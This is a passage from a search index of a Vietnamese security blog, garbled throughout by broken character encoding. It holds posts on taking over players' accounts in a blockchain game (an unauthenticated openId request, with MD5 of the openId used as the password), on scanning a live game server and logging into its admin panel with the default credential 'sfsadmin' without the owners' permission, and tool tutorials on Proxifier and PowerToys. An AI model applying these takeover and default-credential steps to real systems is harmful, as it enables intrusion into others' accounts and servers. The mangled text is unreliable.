v·ªõi crypto blockchain th√¨ c√°i n√†y c√≥ v·∫ª l·∫° l·∫´m, ch·ª© Metamask ƒë√£ qu√° quen thu·ªôc v·ªõi anh em \u0026ldquo;ch∆°i\u0026rdquo; crypto r·ªìi, tuy nhi√™n kh√¥ng ch·∫Øc l√† t·∫•t c·∫£ nh·ªØng ng∆∞·ªùi d√πng n√≥ ƒë√£ hi·ªÉu r√µ v·ªÅ Metamask, c√°c k√Ω kho√° c·ªßa n√≥, v√¢n v√¢n v√† m√¢y m√¢y. N√≥i ƒë∆°n gi·∫£n, Metamask l√† m·ªôt ti·ªán √≠ch gi√∫p l∆∞u tr·ªØ cho m√¨nh kho√° Private-key v√† hi·ªÉn th·ªã Public-key\nGiao di·ªán Metamask\nV√† ƒë∆∞∆°ng nhi√™n l√† kh√¥ng ch·ªâ Metamask c√≥ kh·∫£ nƒÉng l√†m ƒë∆∞·ª£c ƒëi·ªÅu n√†y, c√≥ r·∫•t nhi·ªÅu v√≠ DEX c√≥ th·ªÉ gi√∫p ch√∫ng ta l√†m ƒë∆∞·ª£c ƒëi·ªÅu c∆° b·∫£n Metamask l√†m ƒë∆∞·ª£c, tuy nhi√™n tu·ª≥ v√†o game c√≥ support n√≥ hay kh√¥ng, m√¨nh th·∫•y ƒëa s·ªë game NFT ƒë·ªÅu h·ªó tr·ª£ Metamask n√™n m√¨nh t·∫≠p trung n√≥i v·ªÅ Metamask th√¥i\nGame h·ªó tr·ª£ r·∫•t nhi·ªÅu k·∫øt n·ªëi c√°c v√≠ kh√°c nhau\nK·∫øt n·ªëi t·ªõi h·ªá th·ªëng ƒêi·ªÅu ƒë·∫ßu ti√™n, khi click v√†o Metamask h·ªá th·ªëng s·∫Ω cho ph√©p ta login lu√¥n, v√≠ d·ª•\nV·∫≠y th√¨ ·ªü ƒë√¢y, t·∫°i sao khi click nh∆∞ v·∫≠y th√¨ h·ªá th·ªëng c√≥ th·ªÉ cho ch√∫ng ta login v√†o user c·ªßa ch√∫ng ta lu√¥n, v√† c√≥ th·ªÉ s·ª≠ d·ª•ng v√†i t√≠nh nƒÉng c∆° b·∫£n.\nƒê·ªÉ cho d·ªÖ hi·ªÉu, ƒë√¢y l√† API ƒë·ªÉ server get ƒë∆∞·ª£c username c·ªßa m√¨nh\nCh√∫ng ta c√≥ th·ªÉ th·∫•y th·∫±ng kh√¥ng h·ªÅ c√≥ x√°c th·ª±c, ch·ªâ ƒë∆°n gi·∫£n l√† cung c·∫•p cho API address c·ªßa m√¨nh th√¨ server tr·∫£ v·ªÅ username.\nKhi click v√†o Metamask nh∆∞ v·∫≠y, Metamask s·∫Ω cung c·∫•p cho website public key v√≠ c·ªßa ch√∫ng ta (ch√≠nh l√† ƒë·ªãa ch·ªâ v√≠ ƒë·∫•y), website s·∫Ω s·ª≠ d·ª•ng ƒë·ªãa ch·ªâ v√≠ ƒë·ªÉ login v√†o h·ªá th·ªëng lu√¥n. Gi·ªëng nh∆∞ vi·ªác s·ª≠ d·ª•ng username login v√†o h·ªá th·ªëng m√† kh√¥ng c·∫ßn s·ª≠ d·ª•ng m·∫≠t kh·∫©u v·∫≠y. ·ªö th·∫ø l√†, ai c√≥ ƒë·ªãa ch·ªâ v√≠ c·ªßa m·ªÅnh l√† c≈©ng c√≥ th·ªÉ login v√†o account c·ªßa m·ªÅnh √† ü§î\nCh√≠nh x√°c l√† nh∆∞ v·∫≠y, tuy nhi√™n th√¥ng tin ƒë·∫•y c√≥ l·∫Ω ch·ªâ l√† public th√¥i, khi ch·ªânh s·ª≠a th√¥ng tin user th√¨ ch√∫ng ta c·∫ßn ph·∫£i k√Ω 1 ph√°t ƒë·ªÉ x√°c th·ª±c ƒë√∫ng l√† m√¨nh ƒëang s·ª≠a th√¥ng tin tr√™n account c·ªßa m√¨nh n·ªØa. Vi·ªác n√†y gi·ªëng vi·ªác x√°c th·ª±c ch·ªØ k√Ω ƒëi·ªán t·ª≠ v·∫≠y, kh·∫≥ng ƒë·ªãnh ch√≠nh m√¨nh ƒë√£ k√Ω v√†o ƒë√≥ ch·ª© kh√¥ng ph·∫£i anh h√†ng x√≥m, hay c√¥ b·∫°n th√¢n n√†o ƒë√≥ k√Ω h·ªô ƒë∆∞·ª£c.\n N·∫øu c√≥ th·ªùi gian m√¨nh s·∫Ω b·ªï sung th√™m v·ªÅ ph·∫ßn k√Ω n√†y nh√©\n Hack game th√¥i n√†o L√¢u l√¢u r·ªìi homie c·ªßa m√¨nh c√≥ g·ª≠i cho m√¨nh c√°i link game c·ªßa ng∆∞·ªùi anh em l√°ng gi·ªÅng, c√°c b·∫°n c√≥ th·ªÉ truy c·∫≠p t·∫°i ƒë√¢y https://bidragon.io\nƒê∆∞·ªùng link tr√™n ch·ªâ l√† c√°i market th√¥i, mu·ªën ch∆°i game th√¨ c√°c b·∫°n c·∫ßn ph·∫£i mua NFT game r·ªìi m·ªõi ch∆°i ƒë∆∞·ª£c.\nTruy c·∫≠p v√†o URL ƒë·ªÉ ch∆°i game https://app.bidragon.io/ m√¨nh th·∫•y n√≥ truy c·∫≠p th·∫≥ng tr·ª±c ti·∫øp v√†o game lu√¥n ch·ª© kh√¥ng c·∫ßn m√¨nh l√†m 1 h√†nh ƒë·ªông n√†o kh√°c ü§î ·ªö th·∫ø th√¨, ch·∫Øc ch·∫Øn game ƒë√£ kh√¥ng c√≥ c∆° ch·∫ø verify n√†o v·ªõi account ƒëang truy c·∫≠p v√†o game, v·∫≠y th√¨ m√¨nh c√≥ th·ªÉ s·ª≠ d·ª•ng address b·∫•t k·ª≥ c≈©ng c√≥ th·ªÉ login v√†o game r·ªìi.\nGame s·ª≠ d·ª•ng socket ƒë·ªÉ g·ª≠i d·ªØ li·ªáu, ƒê·ªçc code JS m·ªôt ch√∫t ch√∫ng ta c√≥ th·ªÉ th·∫•y vi·ªác login r·∫•t ƒë∆°n gi·∫£n, g·ª≠i g√≥i tin socket bao g·ªìm login v√† password, do kh√¥ng c·∫ßn t√°c ƒë·ªông g√¨ t·ªõi account c·ªßa m√¨nh c·∫£ n√™n password s·∫Ω ƒë∆∞·ª£c set b·ªüi h·ªá th·ªëng, v·∫≠y th√¨ qu√° tr√¨nh t·∫°o password s·∫Ω di·ªÖn ra nh∆∞ th·∫ø n√†o\nC√≥ th·ªÉ th·∫•y r·∫±ng\n1  _pwd = md5.hexMD5(_DAPP_SDK.openId);   Tuy nhi√™n c√°i openId kia ·ªü ƒë√¢u\nCh·ªâ v·ªõi m·ªôt request ƒë∆°n gi·∫£n bao g·ªìm address, secret th√¨ m·∫∑c ƒë·ªãnh l√† secret=Welcome%20To%20MoonGming%21, signature kh√¥ng c√≥, ta c√≥ th·ªÉ l·∫•y ƒë∆∞·ª£c openId account b·∫•t k·ª≥ r·ªìi\nM·ªôt n·∫°n nh√¢n x·∫•u s·ªë tr√™n top scoreboard ƒë∆∞·ª£c target Server b·∫£o OK, nh·∫≠p password ƒëi tau cho login Nh·∫≠p password l√† md5 c·ªßa openId l·∫•y ƒë∆∞·ª£c ·ªü tr√™n r·ªìi g·ª≠i ƒëi Login success, b√¢y gi·ªù c√≥ th·ªÉ tho·∫£i m√°i s·ª≠ d·ª•ng account n√†y r·ªìi Timeline  Ng√†y 25 th√°ng 8: B√°o c√°o cho ƒë·ªôi dev bidragon th√¥ng qua telegram Ng√†y 26 th√°ng 8: Dev bidragon ƒë√£ fix bug, v√† trao th∆∞·ªüng cho ch√∫ng t√¥i m·ªôt NFT Dragon c·∫•p S.  ƒê∆∞∆°ng nhi√™n r·∫±ng nh·∫≠n r·ªìi l√† b√°n lu√¥n l·∫•y ti·ªÅn - ƒë∆∞·ª£c 4.5BNB (ƒëang ngh√®o m√†)  C√≤n ph·∫ßn n·ªØa, c√°c b·∫°n c√πng ƒë√≥n ƒë·ªçc nh√©\n ","permalink":"https://minhtuanact.ml/posts/lai-hack-game-blockchain-truy-cap-vao-tai-khoan-bat-ky-trong-game/","summary":"Ki·∫øn th·ª©c v·ªÅ Blockchain c·ªßa m√¨nh v·∫´n ƒëang h·∫°n h·∫πp, n·∫øu c√≥ c√¢u n√†o hay ki·∫øn th·ª©c ch·ªó n√†o m√¨nh hi·ªÉu sai th√¨ xin c√°c b·∫°n g√≥p √Ω ·ªü d∆∞·ªõi ph·∫ßn comment nh√©\n D·∫°o g·∫ßn ƒë√¢y m√¨nh c√πng homie c·ªßa m√¨nh c≈©ng hay ƒëi xi√™n c√°c con game Blockchain, do trend NFT game Blockchain ƒëang c·ª±c k·ª≥ n·ªïi b√¢y gi·ªù, nh·∫•t l√† Vi·ªát Nam m√¨nh c√≥ con game Axie Infinity v·ªën ho√° h√†ng t·ª∑ Biden.","title":"L·∫°i hack game Blockchain, truy c·∫≠p v√†o t√†i kho·∫£n b·∫•t k·ª≥ trong game"},{"content":"D·∫°o g·∫ßn ƒë√¢y, ph·∫£i l√† 1 nƒÉm tr·ªü l·∫°i ƒë√¢y trend game blockchain, hay NFT ƒëang r·∫•t th·ªãnh h√†nh v√† m·ªçi ng∆∞·ªùi c√≥ th·ªÉ play to earn, ki·∫øm ti·ªÅn t·ª´ vi·ªác ch∆°i game. Tuy nhi√™n c√≥ r·∫•t nhi·ªÅu d·ª± √°n c·ªë g·∫Øng ƒÉn theo trend m√† b·ªè ƒëi y·∫øu t·ªë security, c·ªë g·∫Øng ra game nhanh nh·∫•t c√≥ th·ªÉ ƒë·ªÉ user ƒë·ª° \u0026ldquo;ch·ª≠i\u0026rdquo; v√¨ ra game l√¢u, √¥m coin ƒë·ªÉ ƒë√≥ l√¢u qu√° gi√° kh√¥ng bay \u0026hellip; v√¢n v√¢n v√† m√¢y m√¢y, ƒë·ªß th·ªÉ lo·∫°i l√Ω do ƒë·ªÉ c√≥ th·ªÉ dev code nhanh nhanh ch√≥ng ch√≥ng ƒë·ªÉ ph·ª•c v·ª• ng∆∞·ªùi ch∆°i. M√¨nh c≈©ng ƒëi d·∫°o tr√™n internet v√† ƒë∆∞·ª£c homie m√¨nh ch·ªâ ƒë·∫øn c√°i trang web game n√†y c·ªßa Vi·ªát Nam, c√πng m√¨nh kh√°m ph√° x√≠u nh√©.\nRecon ƒê·∫ßu ti√™n l√∫c n√†o c≈©ng v·∫≠y r·ªìi, recon xem trang n√†y c√≥ g√¨ n√†ooooo\nSubdomain 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  ‚îå‚îÄ‚îÄ(minhtuan„âøMinhTuan-ACER)-[~] ‚îî‚îÄ$ cat list-domain/moniwar.io https://playtoearn.moniwar.io https://admin.moniwar.io https://dev.daap.moniwar.io https://api.moniwar.io http://playtoearn.moniwar.io http://admin.moniwar.io http://dev.daap.moniwar.io http://api.moniwar.io https://www.moniwar.io https://www.moniwar.io https://daap.moniwar.io https://docs.moniwar.io https://dev.dapp.moniwar.io https://moniwar.io http://www.moniwar.io http://www.moniwar.io http://daap.moniwar.io http://dev.dapp.moniwar.io http://moniwar.io http://docs.moniwar.io   T√¨m ip th·∫≠t Do s·ª≠ d·ª•ng cloudflare n√™n m√¨nh ƒë√£ c·ªë g·∫Øng t√¨m ki·∫øm th√¥ng tin trong ƒë·ªëng subdomain kia th√¨ th·∫•y c√≥ 1 trang web test game http://playtoearn.moniwar.io\nTh·ª≠ s·ª≠ d·ª•ng ch∆°i game 1 t√Ω nh∆∞ng kh√¥ng ƒëƒÉng k√Ω ƒë∆∞·ª£c (th·∫≠t ra sau n√†y m√¨nh ƒë√£ ƒëƒÉng k√Ω ƒë∆∞·ª£c do server b·ªã t·∫Øt th√¥i) m√¨nh th·∫•y c√≥ socket g·ª≠i l√™n server ch√≠nh\nƒê√¢y ch·∫Øc h·∫≥n l√† IP th·∫≠t c·ªßa server ƒë∆∞·ª£c che gi·∫•u ƒë·∫±ng sau cloudflare, v·∫≠y recon ti·∫øp b·∫±ng nmap th√¥i\nAttack Scan port Sau m·ªôt th·ªùi gian m√¨nh th·ª≠ v·ªõi c√°c port scan ƒë∆∞·ª£c, m√¨nh ƒë√£ n·∫Øm ƒë∆∞·ª£c c√°c th√¥ng tin tr√™n server nh∆∞ sau\n  port 22: SSH, m√¨nh check version v√† k ƒëo√°n ƒë∆∞·ª£c user n√™n c·ª© b·ªè qua ƒë√£\n  port 80, 443: Web connect v·ªõi ƒë·ªëng subdomain b√™n tr√™n\n  port 8080: Ch·∫°y d·ªãch v·ª• SmartFoxServer, sau khi t√¨m hi·ªÉu th√¨ con service n√†y l√† server qu·∫£n l√Ω game   port 8888: l√† port socket, ch·∫Øc l√† connect t·ªõi SmartFoxServer\n  port 9933: sau m·ªôt th·ªùi gian t√¨m hi·ªÉu th√¨ port n√†y s·ª≠ d·ª•ng BlueBox, d·ªãch v·ª• ƒëi k√®m SmartFoxServer\n  port 27017: Mongodb, m√¨nh login v·ªõi t√†i kho·∫£n test ƒë∆∞·ª£c nh∆∞ng b√™n trong ch·∫≥ng c√≥ g√¨, kh√¥ng th·ªÉ ki·∫øm th√™m g√¨ ƒë∆∞·ª£c ·ªü ƒë√¢y, ƒë√†nh focus v√†o port 8080\n  T·∫°i sao m√¨nh l·∫°i ƒë·ªÉ port 8080 check cu·ªëi c√πng, th√¨ ƒë√¢y c√°c b·∫°n s·∫Ω hi·ªÉu nguy√™n nh√¢n NƒÉm 2021 r·ªìi, m√¨nh KH√îNG d√πng ƒë∆∞·ª£c Adobe Flash Player n·ªØa, t·∫°i sao v·∫´n c√≥ ng∆∞·ªùi d√πng c√¥ng ngh·ªá c≈© th·∫ø n√†y, ƒë∆∞·ª£c s·ª± tr·ª£ gi√∫p c·ªßa m·ªôt ng∆∞·ªùi b·∫°n, m√¨nh ƒë√£ t·∫£i ƒë∆∞·ª£c VMware win XP c√≥ support v·ª• n√†y =))\nTh·ªÅ lu√¥n nh√¨n qu·∫£ giao di·ªán Win XP x√∫c ƒë·ªông l·∫Øm :(\nV√† r·ªìi, m√¨nh login v√†o ƒë√¢y ƒë∆∞·ª£c r·ªìi :( (user/pass:sfsadmin)\n·ªí may qu√°, cu·ªëi c√πng h·ªç c≈©ng update b·∫£n kh√¥ng c·∫ßn flash :v\n√Ä cho ae xem h√¨nh ·∫£nh game, ch∆°i game gi·ªëng lo·∫°n 12 s·ª© qu√¢n ng√†y x∆∞a K·∫øt L·ªó h·ªïng game n√†y ƒë√£ ƒë∆∞·ª£c fix, tuy nhi√™n c√°i th·ªùi ƒëi·ªÉm m√¨nh t√¨m ra th√¨ m√¨nh kh√¥ng t√†i n√†o c√≥ th·ªÉ li√™n l·∫°c ƒë∆∞·ª£c v·ªõi ƒë·ªôi dev, ƒë·ªçc trong log server th√¨ th·∫•y c√≥ network connect t·∫≠n trong mi·ªÅn Trung hay Nam g√¨ ƒë·∫•y m√¨nh ch·∫£ nh·ªõ l·∫Øm, tuy nhi√™n m√¨nh m·ªõi check l·∫°i th√¨ l·ªó h·ªïng ƒë√£ ƒë∆∞·ª£c fix r·ªìi n√™n m√¨nh public b√†i th√¥i :D\nQua ƒë√¢y c√≥ th·ªÉ th·∫•y, c√≥ v·∫ª dev game ki·ªÉu tay ngang, code web ƒÉn li·ªÅn hay sao ·∫•y, l·ªó h·ªïng n√†y c√≥ th·ªÉ n√≥i l√† c·ª±c k·ª≥ basic, khai th√°c c·ª±c k·ª≥ ƒë∆°n gi·∫£n th√¥ng qua v√†i b∆∞·ªõc recon c∆° b·∫£n. Ho·∫∑c c≈©ng c√≥ th·ªÉ l√† h·ªç ch∆∞a ƒë∆∞·ª£c c·∫©n th·∫≠n l·∫Øm trong kh√¢u setup, tuy nhi√™n d√πng qu·∫£ server ƒë·ªùi t·ªëng th√¨ m√¨nh (baiphuc)\n M√¨nh ƒë·∫∑t title l√† hack game blockchain th·∫ø th√¥i ch·ª© ƒë√¢y l√† hack web b√¨nh th∆∞·ªùng m√†, ch∆∞a c√≥ t√Ω blockchain n√†o ƒë√¢u, ch·∫≥ng qua con game n√†y l√† game blockchain th√¥i (lol). Xin l·ªói m·ªçi ng∆∞·ªùi v√¨ c√°i title kia nh√© huhu\n ","permalink":"https://minhtuanact.ml/posts/hack-game-blockchain-trend-moi-dang-thinh-hanh/","summary":"D·∫°o g·∫ßn ƒë√¢y, ph·∫£i l√† 1 nƒÉm tr·ªü l·∫°i ƒë√¢y trend game blockchain, hay NFT ƒëang r·∫•t th·ªãnh h√†nh v√† m·ªçi ng∆∞·ªùi c√≥ th·ªÉ play to earn, ki·∫øm ti·ªÅn t·ª´ vi·ªác ch∆°i game. Tuy nhi√™n c√≥ r·∫•t nhi·ªÅu d·ª± √°n c·ªë g·∫Øng ƒÉn theo trend m√† b·ªè ƒëi y·∫øu t·ªë security, c·ªë g·∫Øng ra game nhanh nh·∫•t c√≥ th·ªÉ ƒë·ªÉ user ƒë·ª° \u0026ldquo;ch·ª≠i\u0026rdquo; v√¨ ra game l√¢u, √¥m coin ƒë·ªÉ ƒë√≥ l√¢u qu√° gi√° kh√¥ng bay \u0026hellip; v√¢n v√¢n v√† m√¢y m√¢y, ƒë·ªß th·ªÉ lo·∫°i l√Ω do ƒë·ªÉ c√≥ th·ªÉ dev code nhanh nhanh ch√≥ng ch√≥ng ƒë·ªÉ ph·ª•c v·ª• ng∆∞·ªùi ch∆°i.","title":"Hack game Blockchain, trend m·ªõi ƒëang th·ªãnh h√†nh"},{"content":"Root case D·∫°o g·∫ßn ƒë√¢y m√¨nh c√≥ d√≠nh 1 case li√™n quan ƒë·∫øn application tr√™n Windows, vi·ªác check connect network r·∫•t quan tr·ªçng trong pentest, n√≥ s·∫Ω gi√∫p c√°c b·∫°n c√≥ th·ªÉ bi·∫øt ƒë∆∞·ª£c application ƒë√≥ ƒëang g·ª≠i nh·ªØng g√¨, k·∫øt n·ªëi t·ªõi ƒë√¢u tr√™n internet. Tuy nhi√™n d·ªü m·ªôt c√°i l√† application n√†y KH√îNG H·ªñ TR·ª¢ K·∫æT N·ªêI PROXY ƒë·ªÉ capture request qua BurpSuite. V·∫≠y ·ªü ƒë√¢y ch√∫ng ta s·∫Ω c√≥ nhi·ªÅu c√°ch ƒë·ªÉ pentest case n√†y:\n C√†i ƒë·∫∑t m·ªôt s·ªë ph·∫ßn m·ªÅm c√≥ th·ªÉ capture request nh∆∞ Wireshark, HTTP Debugger, Charles, \u0026hellip; C√†i m·ªôt con m√°y ·∫£o l√™n, c√†i application ƒë√≥ v√†o m√°y ·∫£o r·ªìi m·ªü proxy to√†n h·ªá th·ªëng k·∫øt n·ªëi qua BurpSuite S·ª≠ d·ª•ng m·ªôt ch∆∞∆°ng tr√¨nh c√≥ th·ªÉ control network c·ªßa process ƒë√≥ r·ªìi h∆∞·ªõng t·∫•t c·∫£ connection ƒëi qua 1 proxy (·ªü ƒë√¢y l√† BurpSuite) \u0026hellip;. (m√¨nh ch∆∞a nghƒ© ra, c√≥ c√°ch n√†o hay h∆°n c√°c b·∫°n c√≥ th·ªÉ comment b√™n d∆∞·ªõi b√†i ƒë·ªÉ m√¨nh h·ªçc h·ªèi th√™m nha ;)  ·ªû ƒë√¢y c√°c b·∫°n s·ª≠ d·ª•ng c√°ch n√†o :D, m√¨nh ƒë√£ s·ª≠ d·ª•ng qua c√°ch 1, tuy nhi√™n n√≥ g·∫∑p v·∫•n ƒë·ªÅ l√† m√¨nh kh√¥ng quen s·ª≠ d·ª•ng, kh√¥ng c√≥ nhi·ªÅu t√≠nh nƒÉng nh∆∞ BurpSuite n√™n m√¨nh kh√¥ng th√≠ch. Kh√¥ng c√≥ repeater ƒë·ªÉ s·ª≠a request c√°c th·ª©, mu·ªën s·ª≠a request ph·∫£i copy raw request r·ªìi paste sang BurpSuite ƒë·ªÉ pentest =)).\nC√°ch 2 m√¨nh th·∫•y c≈©ng ·ªïn, tuy nhi√™n d·ªü m·ªôt c√°i l√† n√≥ kh√° t·ªën ph·∫ßn c·ª©ng (ƒë·ªëi v·ªõi nh·ªØng ai m√°y y·∫øu th√¨ c·∫£ l√† m·ªôt c·ª±c h√¨nh), vi·ªác t·∫°o k·∫øt n·ªëi proxy full OS nh∆∞ th·∫ø s·∫Ω c√≥ nhi·ªÅu connect r√°c, m√¨nh kh√¥ng s·ª≠ d·ª•ng ƒë·∫øn, c√≥ th·ªÉ gi·∫£i quy·∫øt b·∫±ng vi·ªác add scope v·ªõi BurpSuite nh∆∞ng m√† v·∫´n n·∫∑ng =\u0026gt; v·∫´n l√† kh√¥ng th√≠ch.\nC√°ch 3 m√¨nh th·∫•y ok nh·∫•t, control lu√¥n c√°i network c·ªßa process ƒë√≥ r·ªìi cho ƒëi qua proxy burp, v·ª´a nh·∫π nh√†ng v·ª´a t√¨nh c·∫£m.\nM√¨nh c√≥ nh·∫Øn tin l√™n box h·ªèi anh em xem c√≥ c√°i n√†o x√†i lu√¥n n√†o kh√¥ng, sau m·ªôt th·ªùi gian t√¨m ki·∫øm th√¨ t√¨m ƒë∆∞·ª£c ra 1 c√°i opensource ·ªü ƒë√¢y\nhttps://github.com/VahidN/Process-Proxifier\nNgon v√£i, hi·ªÉn th·ªã c·∫£ process n√†o m√¨nh mu·ªën th√¥ng qua proxy, h·ªó tr·ª£ c·∫£ k·∫øt n·ªëi Socks5 v√† HTTP. C√°c b·∫°n c√≥ th·ªÉ x√†i th·ª≠ xem c√°i n√†y nh√©, kh√° ok ƒë√≥ :D\nTuy nhi√™n, s·∫øp m√¨nh c√≥ g·ª£i √Ω cho 1 program x·ªãn h∆°n v√¨ ph·∫£i tr·∫£ ph√≠ =))\nTh∆∞·ªùng th√¨ m·∫•y th·∫±ng b·∫Øt tr·∫£ ph√≠ th∆∞·ªùng ngon\nProxifier Th√¥i th√¨ b√†i vi·∫øt n√†y t·∫≠p trung v√†o th·∫±ng n√†y th√¥i, n√™n m√¨nh ch·ªâ n√≥i v·ªõi th·∫±ng n√†y th√¥i nh√© =)) (kh√¥ng nh·∫≠n ti·ªÅn qu·∫£ng c√°o tr√° h√¨nh g√¨ c·∫£, ch·ªâ th·∫•y hay n√™n share cho ae th√¥i)\nHome page: https://www.proxifier.com/\nDownload: https://www.proxifier.com/download/ProxifierSetup.exe\nC√°c b·∫°n download r·ªìi v·ªÅ c√†i ƒë·∫∑t nh∆∞ b√¨nh th∆∞·ªùng, kh·ªüi ƒë·ªông program l√™n th√¨ add proxy server v√†o th√¥i (Profile -\u0026gt; Proxy Servers)\n·ªû ƒë√¢y m√¨nh s·ª≠ d·ª•ng BurpSuite l√†m proxy, h·ªó tr·ª£ c·∫£ Socks4, Socks5 v√† HTTP, m√¨nh d√πng HTTP cho th√¢n thu·ªôc\nC√†i ƒë·∫∑t xong th√¨ c√≥ n√∫t Check ƒë·ªÉ c√°c b·∫°n c√≥ th·ªÉ ki·ªÉm tra xem proxy server ho·∫°t ƒë·ªông ok ch∆∞a, nh∆∞ h√¨nh tr√™n l√† ƒë√£ okla r·ªìi nha.\nTi·∫øp theo ƒë·∫øn c√†i ƒë·∫∑t rules ƒë·ªÉ cho Proxifier c√≥ th·ªÉ gi√∫p m√¨nh k·∫øt n·ªëi c√°c process ch·ªâ ƒë·ªãnh t·ªõi proxy server. (Profile -\u0026gt; Proxification Rules)\n·ªû ph·∫ßn n√†y, c√°c b·∫°n nh·ªõ ƒë·ªÉ rule Default c√≥ action l√† Direct nh√©, ƒë·ªÉ tr√°nh l√†m n·∫∑ng proxy server. Khi mu·ªën add 1 program ƒë·ªÉ cho n√≥ k·∫øt n·ªëi th√¥ng qua proxy server th√¨ add rule nh∆∞ h√¨nh b√™n d∆∞·ªõi\nƒêi·ªÅn t√™n rule, applications (ph·∫ßn n√†y n·∫øu c√°c b·∫°n bi·∫øt app ch·∫°y v·ªõi file g√¨ th√¨ g√µ nguy√™n t√™n file v√†o, ho·∫∑c c√≥ th·ªÉ s·ª≠ d·ª•ng nhi·ªÅu file, \u0026hellip;) \u0026hellip; action ch·ªçn server proxy mu·ªën k·∫øt n·ªëi r·ªìi b·∫•m OK\nV·∫≠y xong r·ªìi, to√†n b·ªô connection tr√™n process c·ªßa program ƒë·ªÅu ƒë∆∞·ª£c th√¥ng qua BurpSuite h·∫øt, ngon ph·∫øt :D\nC√°c b·∫°n c≈©ng c√≥ th·ªÉ save l·∫°i profile n√†y ƒë·ªÉ d√πng v·ªÅ sau, c√≥ th·ªÉ s·ª≠ d·ª•ng nhi·ªÅu profile kh√°c nhau ƒë∆∞·ª£c\nK·∫øt N√≥i chung l√† v·ªõi c√°i case c·ªßa m√¨nh th√¨ x√†i Proxifier v·ªõi Process-Proxifier ƒë·ªÅu ngon nh∆∞ nhau, c√°c b·∫°n th·∫•y d√πng c√°i n√†o ƒë∆∞·ª£c th√¨ c·ª© x√†i th√¥i, see yaa\n","permalink":"https://minhtuanact.ml/posts/proxifier-ho-tro-ket-noi-proxy-cho-cac-ung-dung-khong-ho-tro-proxy/","summary":"Root case D·∫°o g·∫ßn ƒë√¢y m√¨nh c√≥ d√≠nh 1 case li√™n quan ƒë·∫øn application tr√™n Windows, vi·ªác check connect network r·∫•t quan tr·ªçng trong pentest, n√≥ s·∫Ω gi√∫p c√°c b·∫°n c√≥ th·ªÉ bi·∫øt ƒë∆∞·ª£c application ƒë√≥ ƒëang g·ª≠i nh·ªØng g√¨, k·∫øt n·ªëi t·ªõi ƒë√¢u tr√™n internet. Tuy nhi√™n d·ªü m·ªôt c√°i l√† application n√†y KH√îNG H·ªñ TR·ª¢ K·∫æT N·ªêI PROXY ƒë·ªÉ capture request qua BurpSuite. V·∫≠y ·ªü ƒë√¢y ch√∫ng ta s·∫Ω c√≥ nhi·ªÅu c√°ch ƒë·ªÉ pentest case n√†y:","title":"Proxifier - H·ªó tr·ª£ k·∫øt n·ªëi proxy cho c√°c ·ª©ng d·ª•ng kh√¥ng h·ªó tr·ª£ proxy"},{"content":"Root case Hi, d·∫°o g·∫ßn ƒë√¢y ch·∫Øc h·∫≥n c√°c b·∫°n, anh em ƒëang l√†m vi·ªác t·∫°i nh√† do d·ªãch (ch·∫Øc c≈©ng c√≥ c√°c b·∫°n ƒë√£ l√†m offline r·ªìi). M√¨nh th√¨ c≈©ng v·∫´n ƒëang l√†m vi·ªác t·∫°i nh√†, c≈©ng d√†nh 1 √≠t ƒë·ªÉ upgrade c√°i workspace c·ªßa m√¨nh l√™n m·ªôt t√Ω. M√¨nh th·∫•y c√≥ 1 v·∫•n ƒë·ªÅ l√† khi m√¨nh n√¢ng c·∫•p s·ª≠ d·ª•ng m√†n h√¨nh FHD l√™n m√†n h√¨nh QHD (2K), do c√°i m√†n 2K n√≥ to h∆°n, v√† nhi·ªÅu kh√¥ng gian hi·ªÉn th·ªã h∆°n n√™n m√¨nh kh√¥ng th·ªÉ nh√¨n th·∫•y h·∫øt to√†n b·ªô n·ªôi dung hi·ªÉn th·ªã tr√™n m√†n h√¨nh ƒë∆∞·ª£c (m·ªü tr√¨nh duy·ªát full m√†n h√¨nh l√† kh√¥ng th·ªÉ nh√¨n h·∫øt ho·∫∑c c√≥ nh·ªØng ph·∫ßn b·ªã th·ª´a, r·∫•t ph√≠)\nL√∫c n√†y m√¨nh m·ªõi s·ª≠ d·ª•ng t√≠nh nƒÉng Snap Windows, tuy nhi√™n n√≥ v·∫´n KH√îNG TH·ªÇ ƒê√ÅP ·ª®NG m√¨nh, v√¨ khi chia ƒë√¥i m√†n h√¨nh ra, ph·∫ßn tr√¨nh duy·ªát m√¨nh hay s·ª≠ d·ª•ng th√¨ tr√¥ng l·∫°i b√©, c√°c ph·∫ßn kh√°c m√¨nh c·∫ßn kh√¥ng gian hi·ªÉn th·ªã nh·ªè h∆°n m·ªôt ch√∫t th√¨ l·∫°i to, n√≥i chung l√† kh√¥ng v·ª´a √Ω =)). M√¨nh ƒë√£ t√¨m c√°c ph·∫ßn m·ªÅm xem c√≥ c√°i n√†o chia m√†n h√¨nh ra d·∫°ng custom (theo √Ω m√¨nh) hay kh√¥ng, th√¨ m√¨nh t√¨m th·∫•y 2 c√°i l√† Lenovo Display Control Center (c√°i n√†y l√† tr√¨nh qu·∫£n l√Ω m√†n h√¨nh c·ªßa c√°i m√†n h√¨nh c·ªßa m√¨nh) v√† Aquasnap windows\nLenovo Display Control Center th√¨ support chia m√†n h√¨nh custom r·∫•t ngon, k√©o th·∫£ app t·ª± resize theo ƒë√∫ng k√≠ch c·ª° ƒë·ªãnh s·∫µn ok, m√¨nh d√πng c√°i n√†y m·ªôt th·ªùi gian th√¨ t·∫°m chia tay :cry:\nAquasnap windows th√¨ s·ª≠ d·ª•ng nhi·ªÅu m√†n h√¨nh c√≥ l·ª£i th√¥i ch·ª© c≈©ng kh√¥ng c√≥ chia m√†n custom g√¨ c·∫£\nM·ªõi ƒë√¢y th√¨ Windows 11 c≈©ng c√≥ nhi·ªÅu Snap Windows h∆°n, tuy nhi√™n v·∫´n th√≠ch custom h∆°n n√™n m√¨nh b·ªè n√≥ qua m·ªôt b√™n. V√† r·ªìi ch√¢n √°i xu·∫•t hi·ªán, ph·∫ßn m·ªÅm n√†y ƒë∆∞·ª£c s·∫øp @vigov5 m√¨nh suggest cho d√πng, qu·∫£ th·ª±c l√† ngon v√† l·∫°i c√≤n l√† h√†ng ch√≠nh ch·ªß Microsoft n·ªØa (m·∫∑c d√π ƒëang trong giai ƒëo·∫°n preview nh∆∞ng x√†i v·∫´n l√† ngon), ƒë√≥ ch√≠nh l√† PowerToys. V·∫≠y t·∫°i sao ngon th√¨ xu·ªëng d∆∞·ªõi m√¨nh ch·ªâ cho nh√© =))\nPowerToys  Trang ch·ªß: https://docs.microsoft.com/en-us/windows/powertoys/ L√† m·ªôt opensource n√™n ph·∫£i c√≥ link Github r·ªìi: https://github.com/microsoft/PowerToys  FancyZones ƒê√¢y l√† t√≠nh 